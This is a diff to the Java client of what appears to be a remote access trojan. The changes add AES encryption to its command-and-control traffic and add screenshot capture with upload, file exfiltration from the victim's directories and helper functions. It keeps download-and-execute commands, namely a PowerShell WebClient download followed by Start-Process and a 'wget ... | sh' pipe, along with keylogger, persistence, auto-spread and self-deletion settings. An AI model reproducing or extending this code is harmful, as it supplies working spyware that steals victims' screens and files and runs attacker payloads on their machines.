@@ -1,7 +1,11 @@
 package Client;
 
 
-
+import javax.crypto.BadPaddingException;
+import javax.crypto.Cipher;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
+import javax.crypto.spec.SecretKeySpec;
 import javax.imageio.ImageIO;
 import javax.swing.*;
 import java.awt.*;
@@ -13,8 +17,12 @@ import java.io.*;
 import java.net.InetAddress;
 import java.net.Socket;
 import java.net.URI;
+import java.security.InvalidKeyException;
+import java.security.Key;
+import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Base64;
 import java.util.Random;
 import java.util.concurrent.TimeUnit;
 
@@ -29,6 +37,7 @@ public class Client {
     private static File directory;
     private static DataInputStream dis;
     private static boolean keyLogger = true;
+    private static String aesKey = "";
 
     private static String USERNAME = System.getProperty("user.name");
     private static String JRE_VERSION = System.getProperty("java.version");
@@ -108,10 +117,16 @@ public class Client {
             dos = new DataOutputStream(socket.getOutputStream());
             dis = new DataInputStream(socket.getInputStream());
 
+            if (debugMode){
+                System.out.println(" === AES KEY: " + aesKey);
+                System.out.println(" === Debug Mode: true");
+                System.out.println(" === Host: " + HOST);
+            }
+
             while (true) {
                 String input;
                 try {
-                    input = dis.readUTF();
+                    input = decrypt(dis.readUTF(), aesKey);
                     if (debugMode) {
                         System.out.println(input);
                     }
@@ -143,12 +158,11 @@ public class Client {
                     showMessagebox(toSet.toString());
                 } else if (input.equals("SYINFO")) {
                     /*
-                    "SYINFO" NOT A TYPO!!!!! Prevents clash with "SYS"
+                    "SYINFO" NOT A TYPO!!!!! Prevents clash with "SYS" command
                     SERVER: SYINFO
                     CLIENT: SYINFO
                     CLIENT: here's the info
                      */
-                    System.out.println("Executing getAndSendSysInfo()");
                     getAndSendSysInfo();
                 } else if (input.contains("CLIPSET")) {
                     /*
@@ -183,19 +197,43 @@ public class Client {
                     String target = input.split(" ")[1];
                     doWebDelivery(url, target);
                 } else if (input.contains("VISIT")) {
-                    System.out.println("GOING TO: " + new URI(input.split(" ")[1]).toString());
+                    if (debugMode) {
+                        System.out.println("GOING TO: " + new URI(input.split(" ")[1]).toString());
+                    }
                     Desktop.getDesktop().browse(new URI(input.split(" ")[1]));
                 } else if (input.contains("SCREENSHOT")) {
                     communicate("SCREENSHOT");
-                    File f = null;
-                    String filename = "Screenshot_" + new java.util.Date(System.currentTimeMillis()) + ".png";
-                    try {
-                        Robot r = new Robot();
-                        Rectangle capture = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
-                        BufferedImage bufferedImage = r.createScreenCapture(capture);
-                        ImageIO.write(bufferedImage, "jpg", f);
-                        sendFile();
-                    } catch (AWTException | IOException ex){}
+                    // Next bytes of length n will be the image
+                    // SERVER: SCREENSHOT
+                    // CLIENT: filename
+                    // CLIENT: b64.encode(file).length
+                    // CLIENT: base64.encode(file).bytes.each
+                    Robot robot = new Robot();
+                    String format = "jpg";
+                    String filename = System.getProperty("java.io.tmpdir") + randTextAlphaRestricted(12) + ".jpg";
+                    Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+                    BufferedImage fullImg = robot.createScreenCapture(screenRect);
+                    ImageIO.write(fullImg, format, new File(filename));
+                    if (debugMode){ System.out.println("Screenshot saved to: " + filename); }
+
+                    // Done writing file, talk to server now
+
+                    File imgFile = new File(filename);
+                    communicate(filename.substring(filename.lastIndexOf(File.separator))); // Send filename ONLY, no path
+                    long length = imgFile.length(); // get file length
+                    dos.writeLong(length);
+
+                    FileInputStream fis = new FileInputStream(imgFile);
+                    BufferedInputStream bs = new BufferedInputStream(fis);
+
+                    int fbyte;
+                    while ((fbyte = bs.read()) != -1) {
+                        dos.writeInt(fbyte);
+                    }
+                    bs.close();
+                    fis.close();
+                    if (debugMode){ System.out.println("Screenshot sent");}
+                    //communicate(b64); // Send the encoded file
                 } else if (input.contains("EXIT")) {
                     communicate("EXIT");
                     File f = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
@@ -211,12 +249,12 @@ public class Client {
                     // Attempts to download and execute a binary. If it is successful, send back `1`, else `0`.
                     if (SYSTEMOS.contains("Windows")){
                         int status = execNoComm("PowerShell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('" + url + "', '" + fname + "');Start-Process '" + fname + "'");
-                        System.out.println("DaE status: " + status);
+                        if (debugMode){System.out.println("DaE status: " + status);}
                         communicate(status);
                     } else {
                         // Probably bash/sh. Use sh just to be safe
                         int status = execNoComm("wget '"+ url + "' -O - | sh");
-                        System.out.println("DaE status: " + status);
+                        if (debugMode){System.out.println("DaE status: " + status);}
                         communicate(status);
                     }
                     communicate(1);
@@ -233,8 +271,9 @@ public class Client {
 
     private void communicate(String msg) {
         try {
-            dos.writeUTF(msg);
-        } catch (IOException e) {
+            String toSend = encrypt(msg, aesKey);
+            dos.writeUTF(toSend);
+        } catch (Exception e) {
             if (debugMode) {
                 e.printStackTrace();
             }
@@ -243,11 +282,13 @@ public class Client {
 
     private void communicate(int msg) {
         try {
-            dos.writeInt(msg);
-        } catch (IOException e) {
+            String toSend = encrypt(String.valueOf(msg), aesKey);
+            dos.writeUTF(toSend);
+        } catch (Exception e) {
             if (debugMode) {
                 e.printStackTrace();
-            }        }
+            }
+        }
     }
 
     // To be used for binary file transfers
@@ -334,12 +375,13 @@ public class Client {
                 stringBuilder.append(line);
             }
             String[] settings = stringBuilder.toString().split(" ");
-            if (settings.length == 5) {
+            if (settings.length == 6) {
                 HOST = (settings[0]);
                 PORT = (Integer.parseInt(settings[1]));
                 isPersistent = (Boolean.parseBoolean(settings[2]));
                 autoSpread = (Boolean.parseBoolean(settings[3]));
                 debugMode = (Boolean.parseBoolean(settings[4]));
+                aesKey = settings[5];
             }
         } catch (IOException e) {
             if (debugMode) {
@@ -356,13 +398,13 @@ public class Client {
 
     private void directoryChange() throws IOException {
         if (directory != null) {
-            String directoryName = dis.readUTF();
+            String directoryName = readFromDis(dis);
             directory = new File(directory.getAbsolutePath() + "/" + directoryName);
             directory.isDirectory();
         }
     }
 
-    private void sendFileList() {
+    private void sendFileList() throws IOException{
         if (directory == null) {
             String directory = System.getProperty("user.home") + "/Downloads/";
             Client.directory = new File(directory);
@@ -374,7 +416,7 @@ public class Client {
         File[] files = new File(directory.getAbsolutePath()).listFiles();
         communicate(directory.getAbsolutePath());
         assert files != null;
-        communicate(files.length);
+        communicateInt(dos, files.length); // int
         for (File file : files) {
             String name = file.getName();
             communicate(name);
@@ -382,24 +424,50 @@ public class Client {
         communicate("END");
     }
 
-    // Sends back a '1' for success or '0' for failure
-    private void downloadAndExecute(String url){
-        if (SYSTEMOS.contains("Windows")){
-            // TODO rng for name
-            exec("$down=New-Object System.Net.WebClient;$url='"+ url + "';$file='Au37bk.exe';$down.DownloadFile($url,$file);$exec=New-Object -com shell.application; $exec.shellexecute($file);exit;");
-        } else {
-
-        }
-    }
 
     private void sendFile() {
         try {
             communicate("DOWNLOAD");
-            String fileName = dis.readUTF();
-            File filetoDownload = new File(directory.getAbsolutePath() + "/" + fileName);
+            String fileName = readFromDis(dis);
+            File f = new File(fileName);
+            File filetoDownload;
+            if (debugMode){ System.out.println("Sending " + fileName + "\n===\n" + f.getName()); }
+            if (directory != null){ // If this isn't being called when the server is in the File Explorer, directory will be uninitialized (null)
+                filetoDownload = new File(directory.getAbsolutePath() + File.separator + fileName);
+            } else {
+                filetoDownload = f;
+            }
+
             Long length = filetoDownload.length();
             dos.writeLong(length);
-            dos.writeUTF(fileName);
+            communicate(f.getName());
+
+            FileInputStream fis = new FileInputStream(filetoDownload);
+            BufferedInputStream bs = new BufferedInputStream(fis);
+
+            int fbyte;
+            while ((fbyte = bs.read()) != -1) {
+                dos.writeInt(fbyte);
+            }
+            bs.close();
+            fis.close();
+            if (debugMode){ System.out.println("File sent");}
+        } catch (IOException e) {
+            if (debugMode) {
+                e.printStackTrace();
+            }
+        }
+    }
+
+    private void sendFileAlone() {
+        try {
+            communicate("DOWNLOAD");
+            String fileName = readFromDis(dis);
+            if (debugMode){ System.out.println("Sending " + fileName); }
+            File filetoDownload = new File(fileName);
+            Long length = filetoDownload.length();
+            dos.writeLong(length);
+            communicate(fileName);
 
             FileInputStream fis = new FileInputStream(filetoDownload);
             BufferedInputStream bs = new BufferedInputStream(fis);
@@ -413,7 +481,8 @@ public class Client {
         } catch (IOException e) {
             if (debugMode) {
                 e.printStackTrace();
-            }        }
+            }
+        }
     }
 
     private void getAndSendSysInfo(){
@@ -437,18 +506,6 @@ public class Client {
         }
         JFrame.setDefaultLookAndFeelDecorated(true);
         JFrame frame = new JFrame("ALERT");
-        /*frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
-
-        //JOptionPane alert = new JOptionPane(msg, JOptionPane.INFORMATION_MESSAGE);
-
-        /*JPanel panel = new JPanel();
-        panel.setLayout(new FlowLayout());
-        panel.add(alert);
-        //frame.add(alert);
-        //frame.pack();
-        frame.setAlwaysOnTop(true);
-        frame.setVisible(true);
-        */
         frame.setAlwaysOnTop(true);
         frame.setAutoRequestFocus(true);
         frame.setEnabled(true);
@@ -458,7 +515,7 @@ public class Client {
 
     public void doWebDelivery(String url, String target){
         String cmd = "";
-        System.out.println(target);
+        if (debugMode){ System.out.println("Web Delivery target: " + target); }
         switch (target){
             case "python":
                 if (SYSTEMOS.contains("Windows")){
@@ -476,6 +533,23 @@ public class Client {
     }
 
     public String randTextAlpha(int length){
+        int leftLimit = 65; // letter 'A'
+        int rightLimit = 122; // letter 'z'
+        Random rand = new Random();
+        StringBuilder buffer = new StringBuilder();
+        for (int i = 0; i < length; i++){
+            int randomLimitedInt = leftLimit + (int)
+                    (rand.nextFloat() * (rightLimit - leftLimit + 1));
+            if (randomLimitedInt == 92 ){ // `\` char
+                i = i - 1;
+                continue;
+            }
+            buffer.append((char) randomLimitedInt);
+        }
+        return buffer.toString();
+    }
+
+    public String randTextAlphaRestricted(int length){
         int leftLimit = 97; // letter 'a'
         int rightLimit = 122; // letter 'z'
         Random rand = new Random();
@@ -486,5 +560,46 @@ public class Client {
             buffer.append((char) randomLimitedInt);
         }
         return buffer.toString();
+    }
+
+    public static String encrypt(String data, String key) {
+        byte[] encryptedValue;
+        try {
+            Key keyVal = generateEncryptionKey(key.getBytes());
+            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
+            cipher.init(Cipher.ENCRYPT_MODE, keyVal);
+            encryptedValue = cipher.doFinal(data.getBytes());
+        } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | IllegalBlockSizeException | BadPaddingException e){
+            e.printStackTrace();
+            return null;
+        }
+        return Base64.getEncoder().encodeToString(encryptedValue);
+    }
+
+    public static String decrypt(String data, String key) {
+        byte[] decValue = {};
+        try {
+            Key encryptionKey = generateEncryptionKey(key.getBytes());
+            Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
+            c.init(Cipher.DECRYPT_MODE, encryptionKey);
+            byte[] decodedValue = Base64.getDecoder().decode(data);
+            decValue = c.doFinal(decodedValue);
+        } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | IllegalBlockSizeException | BadPaddingException e){
+            e.printStackTrace();
+        }
+        return new String(decValue);
+    }
+
+    private static Key generateEncryptionKey(byte[] key){
+        return new SecretKeySpec(key, "AES");
+    }
+
+
+    public static String readFromDis(DataInputStream dis) throws IOException{
+        return decrypt(dis.readUTF(), aesKey);
+    }
+
+    public static void communicateInt(DataOutputStream dos, int i) throws IOException{
+        dos.writeInt(i);
     }
 }
